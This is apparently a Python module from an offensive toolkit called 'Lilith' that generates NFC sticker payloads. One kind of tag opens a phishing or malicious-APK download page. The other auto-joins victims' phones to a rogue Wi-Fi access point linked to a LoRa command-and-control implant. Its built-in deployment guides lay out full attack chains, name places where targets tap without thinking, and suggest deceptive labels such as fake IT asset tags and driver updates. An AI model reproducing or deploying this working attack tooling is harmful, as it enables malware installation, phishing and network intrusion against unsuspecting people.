"""
Lilith — NFC tag NDEF payload generator

Encodes a delivery URL into a binary NDEF URI record ready to flash onto any
NTAG213/215/216 sticker (the kind that comes bundled with T-Embed Plus and most
ESP32 dev kits).

Default URL: https://lhost:port/android/  (Android APK lure — built by --android-payload)
Override   : --nfc-url  (any HTTPS URL, e.g. wasm_loader.html, custom phishing page)

Files generated:
  tag.ndef   — raw binary NDEF TLV, write with ndeftool or nfc-mfclassic
  tag_url.txt — plain-text URL + deployment guide

Physical attack chain:
  1. Build server-side payload:  lilith build --android-payload
  2. Generate NFC tag:           lilith build --nfc
  3. Write tag.ndef to sticker:  ndeftool write tag.ndef  (or NFC Tools app)
  4. Place sticker in target area with social-engineering label
  5. Victim taps phone → browser opens → APK downloads → tap Install
"""

import os
import struct


# ── WFA Wi-Fi Simple Configuration TLV IDs ───────────────────────────────────

_WSC_CREDENTIAL    = 0x100E
_WSC_SSID          = 0x1045
_WSC_AUTH_TYPE     = 0x1003
_WSC_ENCR_TYPE     = 0x100F
_WSC_NETWORK_KEY   = 0x1027
_WSC_MAC_ADDRESS   = 0x1020
_WSC_VENDOR_EXT    = 0x1049

# Auth / encryption constants (WPA2-Personal / AES)
_WSC_AUTH_WPA2     = b"\x00\x20"
_WSC_ENCR_AES      = b"\x00\x08"
_WSC_MAC_BROADCAST = b"\xff\xff\xff\xff\xff\xff"

# WFA vendor extension: Wi-Fi Alliance OUI (00:50:F2) + version sub-element
_WSC_WFA_OUI_VER   = b"\x00\x37\x2a\x00\x01\x20"   # OUI 00:37:2a, sub-elem 0x00, version 2.0


# ── NDEF URI prefix table (NFC Forum URI RTD v1.0) ───────────────────────────

_URI_PREFIXES = [
    (0x02, "https://www."),
    (0x04, "https://"),
    (0x01, "http://www."),
    (0x03, "http://"),
]


def _ndef_uri_record(url: str) -> bytes:
    """Build a Well-Known URI NDEF record (short record, no ID)."""
    prefix_byte = 0x00
    uri_body    = url
    for code, pfx in _URI_PREFIXES:
        if url.startswith(pfx):
            prefix_byte = code
            uri_body    = url[len(pfx):]
            break

    payload = bytes([prefix_byte]) + uri_body.encode("utf-8")

    # Record header: MB=1 ME=1 CF=0 SR=1 IL=0 TNF=001 (Well Known)
    header   = 0xD1
    type_len = 1
    pay_len  = len(payload)

    if pay_len > 255:
        # Long record — SR=0, 4-byte payload length
        header  = 0xC1
        record  = bytes([header, type_len]) + struct.pack(">I", pay_len) + b"U" + payload
    else:
        record  = bytes([header, type_len, pay_len]) + b"U" + payload

    return record


def _ndef_message_tlv(record: bytes) -> bytes:
    """Wrap NDEF record(s) in the NFC Forum NDEF TLV container."""
    n = len(record)
    if n < 0xFF:
        length_field = bytes([n])
    else:
        # 3-byte length: 0xFF + 2-byte big-endian
        length_field = bytes([0xFF]) + struct.pack(">H", n)

    return bytes([0x03]) + length_field + record + bytes([0xFE])


def _instructions(url: str, ndef_path: str) -> str:
    ndef_name = os.path.basename(ndef_path)
    return f"""\
Lilith NFC tag — deployment guide
══════════════════════════════════════════════════════════════════

URL encoded in tag:
  {url}

NDEF binary: {ndef_name}  ({os.path.getsize(ndef_path)} bytes)
Fits any NTAG213 (144B), NTAG215 (504B), NTAG216 (888B) sticker.

──────────────────────────────────────────────────────────────────
Method 1 — Android / iOS (NFC Tools app, fastest)
──────────────────────────────────────────────────────────────────
  1. Install "NFC Tools" (free, by wakdev) on your phone
  2. Open NFC Tools → Write → Add a record → URL/URI
  3. Paste:  {url}
  4. Tap "Write" → scan sticker

Method 2 — Linux + ndeftool (scriptable)
──────────────────────────────────────────────────────────────────
  pip install ndeftool nfcpy
  ndeftool write {ndef_name}
  # Hold NFC reader over sticker when prompted

Method 3 — libnfc + ACR122U (raw write)
──────────────────────────────────────────────────────────────────
  sudo nfc-mfclassic W a u {ndef_name}
  # (for Mifare Classic tags — NTAG use ndeftool instead)

Method 4 — Flipper Zero
──────────────────────────────────────────────────────────────────
  Flipper → NFC → Detect Reader → hold over sticker
  Or use qFlipper to write .nfc dump with NDEF payload.

──────────────────────────────────────────────────────────────────
Physical deployment tips
──────────────────────────────────────────────────────────────────
  HIGH VALUE locations (targets tap without thinking):
    • Over/under a QR code ("Scan here too")
    • On a printer or copier ("Tap to connect")
    • On a conference room TV/projector remote
    • On a charging pad or USB-C hub on a desk
    • Inside a visitor badge or lanyard badge holder

  LABEL IDEAS (print small sticker over the NFC sticker):
    • "Wi-Fi → Tap to connect"
    • "Scan for driver update"
    • "Tap to download meeting agenda"
    • "Asset tag — IT Dept."

  NOTE: Android shows "Open link?" notification — victim must tap once.
        iOS 14+ shows URL preview before opening.
        The lure label makes them tap without reading carefully.

──────────────────────────────────────────────────────────────────
Server must be running when victim taps:
  lilith serve
──────────────────────────────────────────────────────────────────
"""


# ── WFA WSC WiFi handover helpers ────────────────────────────────────────────

def _wsc_tlv(tag: int, value: bytes) -> bytes:
    return struct.pack(">HH", tag, len(value)) + value


def _wsc_credential(ssid: str, password: str) -> bytes:
    """Build a WFA WSC Credential TLV (used by Android NFC WiFi handover)."""
    inner = (
        _wsc_tlv(_WSC_SSID,        ssid.encode("utf-8"))
        + _wsc_tlv(_WSC_AUTH_TYPE, _WSC_AUTH_WPA2)
        + _wsc_tlv(_WSC_ENCR_TYPE, _WSC_ENCR_AES)
        + _wsc_tlv(_WSC_NETWORK_KEY, password.encode("utf-8"))
        + _wsc_tlv(_WSC_MAC_ADDRESS, _WSC_MAC_BROADCAST)
    )
    # Vendor extension with WFA OUI + version marks this as Wi-Fi Simple Config v2.0
    vendor = _wsc_tlv(_WSC_VENDOR_EXT, _WSC_WFA_OUI_VER)
    return _wsc_tlv(_WSC_CREDENTIAL, inner) + vendor


def _ndef_mime_record(mime_type: str, payload: bytes) -> bytes:
    """Build a single-record NDEF message with MIME media type (TNF=0x02)."""
    type_b = mime_type.encode("ascii")
    if len(payload) > 255:
        # Long record — SR=0: MB=1,ME=1,CF=0,SR=0,IL=0,TNF=2 = 0xC2
        header = 0xC2
        record = bytes([header, len(type_b)]) + struct.pack(">I", len(payload)) + type_b + payload
    else:
        # Short record — SR=1: MB=1,ME=1,CF=0,SR=1,IL=0,TNF=2 = 0xD2
        header = 0xD2
        record = bytes([header, len(type_b), len(payload)]) + type_b + payload
    return record


def _wifi_instructions(ssid: str, password: str, ndef_path: str) -> str:
    ndef_name = os.path.basename(ndef_path)
    size      = os.path.getsize(ndef_path)
    return f"""\
Lilith NFC WiFi Handover tag — deployment guide
══════════════════════════════════════════════════════════════════

WiFi credentials encoded:
  SSID     : {ssid}
  Auth     : WPA2-Personal / AES
  Password : {password}

NDEF binary : {ndef_name}  ({size} bytes)
Format      : WFA Wi-Fi Simple Configuration (WSC) v2.0
Fits        : NTAG213 (144B) or larger

──────────────────────────────────────────────────────────────────
Attack chain — NFC tap → auto-WiFi → LoRa C2 reachable
──────────────────────────────────────────────────────────────────
  1. Flash teembed_relay.ino to T-Embed Plus  (lilith build --lora)
     T-Embed broadcasts SSID: {ssid}
  2. Write this tag to an NFC sticker
  3. Place sticker near target device (under a keyboard, on a charger, etc.)
  4. Target taps sticker → Android shows "Connect to {ssid}?" → taps OK
  5. Phone connects to T-Embed AP (192.168.4.1) automatically
  6. Run lora_listener.py to receive beacons from lora_implant.ps1

──────────────────────────────────────────────────────────────────
Writing the tag
──────────────────────────────────────────────────────────────────
Method 1 — NFC Tools app (Android, fastest):
  Open NFC Tools → Write → Add record → Wi-Fi Network
  SSID: {ssid}   Password: {password}   Security: WPA2

Method 2 — ndeftool (Linux):
  pip install ndeftool nfcpy
  ndeftool write {ndef_name}

Method 3 — Flipper Zero:
  Use qFlipper to write the .nfc dump file.

──────────────────────────────────────────────────────────────────
Notes
──────────────────────────────────────────────────────────────────
  • Android 10+ shows "Connect to <SSID>?" popup on tap — one tap to join.
  • iOS 14+ supports WiFi Handover but requires WPA2-Enterprise-style provisioning
    profiles; this tag targets Android only.
  • Password is stored in plaintext in the NDEF record — do not leave the
    sticker unattended after the engagement.
"""


# ── public API ────────────────────────────────────────────────────────────────

def build_nfc_wifi_payload(ssid: str, password: str, output_dir: str) -> bool:
    """Generate a WFA WSC NFC WiFi Handover NDEF tag.

    When an Android device taps the sticker it shows "Connect to <ssid>?"
    and joins the network automatically on confirmation — no URL, no browser.

    ssid       : WiFi AP name broadcast by the T-Embed relay
    password   : WPA2 passphrase
    output_dir : directory to write wifi_handover.ndef + wifi_handover.txt
    """
    os.makedirs(output_dir, exist_ok=True)

    wsc     = _wsc_credential(ssid, password)
    record  = _ndef_mime_record("application/vnd.wfa.wsc", wsc)
    tlv     = _ndef_message_tlv(record)

    ndef_path = os.path.join(output_dir, "wifi_handover.ndef")
    txt_path  = os.path.join(output_dir, "wifi_handover.txt")

    with open(ndef_path, "wb") as f:
        f.write(tlv)

    guide = _wifi_instructions(ssid, password, ndef_path)
    with open(txt_path, "w") as f:
        f.write(guide)

    print(f"[+] {ndef_path}  ({len(tlv)} bytes NDEF TLV — WFA WSC WiFi Handover)")
    print(f"[+] {txt_path}")
    print()
    print(f"[*] SSID     : {ssid}")
    print(f"[*] Password : {password}")
    print(f"[*] Auth     : WPA2-Personal / AES")
    print(f"[*] Tap      : Android shows 'Connect to {ssid}?' → one-tap WiFi join")
    print(f"[*] Chain    : NFC tap → T-Embed AP → LoRa → lora_listener.py")
    print()
    print("[*] Write with NFC Tools (Android): Write → Wi-Fi Network → fill fields")
    print(f"    OR: ndeftool write {ndef_path}")

    return True


def build_nfc_payload(url: str, output_dir: str) -> bool:
    """Generate NDEF binary + deployment guide for an NFC tag.

    url        : full URL to encode (https://lhost:port/android/ by default)
    output_dir : directory to write tag.ndef and tag_url.txt into
    """
    os.makedirs(output_dir, exist_ok=True)

    record   = _ndef_uri_record(url)
    tlv      = _ndef_message_tlv(record)

    ndef_path = os.path.join(output_dir, "tag.ndef")
    txt_path  = os.path.join(output_dir, "tag_url.txt")

    with open(ndef_path, "wb") as f:
        f.write(tlv)

    guide = _instructions(url, ndef_path)
    with open(txt_path, "w") as f:
        f.write(guide)

    print(f"[+] {ndef_path}  ({len(tlv)} bytes NDEF TLV)")
    print(f"[+] {txt_path}")
    print()
    print(f"[*] URL  : {url}")
    print(f"[*] Tag  : {len(tlv)} bytes — fits NTAG213 (144B) and larger")
    print()
    print("[*] Write with NFC Tools app (Android/iOS): paste URL → Write → scan sticker")
    print(f"    OR: ndeftool write {ndef_path}")
    print()
    print("[*] Server must be live when victim taps: lilith serve")

    return True
